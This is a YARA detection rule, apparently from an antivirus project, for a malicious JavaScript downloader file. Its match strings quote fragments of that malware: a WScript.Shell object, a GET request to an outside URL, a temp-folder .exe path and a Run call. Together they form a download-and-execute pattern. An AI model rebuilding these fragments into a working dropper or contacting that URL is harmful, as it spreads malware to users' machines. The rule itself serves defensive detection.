rule sig_20160330_13c74f7f384a01e476f219f5d3728836 {
  meta:
    description = "datamaliciousorder - file 20160330_13c74f7f384a01e476f219f5d3728836.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "09ec34e3b353da714acb36e8ecfd53c00ebccd0db69711763c4784b929fb0680"

  strings:
    $s1  = "var R = function T() {return WScript[E](\"WScript\"+\".Shell\");}(), I0 = 11;" fullword ascii
    $s2  = "function CP(F0, HF){D = D * 1; return F0 - HF;};" fullword ascii
    $s3  = "HR[IG](\"GET\", \"http://tools24.nl/w8isa\", false);" fullword ascii
    $s4  = "if (HR[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function O() {return R[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"BjIkAJf3al37LmF.ex\" + \"e\";};" fullword ascii
    $s6  = "function DZ(){return OV + \"\";};" fullword ascii
    $s7  = "function FW(K){R[\"Run\"](K, D, D);};" fullword ascii
    $s8  = "function UC() {return ((H == true) && (H == P)) ? 1 : D;};" fullword ascii
    $s9  = "function IY(){return 22;};" fullword ascii
    $s10 = "var WM = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (TU);" fullword ascii
    $s12 = "return CP(X0, NK);" fullword ascii
    $s13 = "function JJ(G) {var J = (1, 2, 3, 4, 5, G); return J;};" fullword ascii
    $s14 = "function GT()" fullword ascii
    $s15 = "function Q(){return E;};" fullword ascii
    $s16 = "var E0 = false;" fullword ascii
    $s17 = "H = true; " fullword ascii
    $s18 = "var H = false;" fullword ascii
    $s19 = "P = true; " fullword ascii
    $s20 = "var P = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}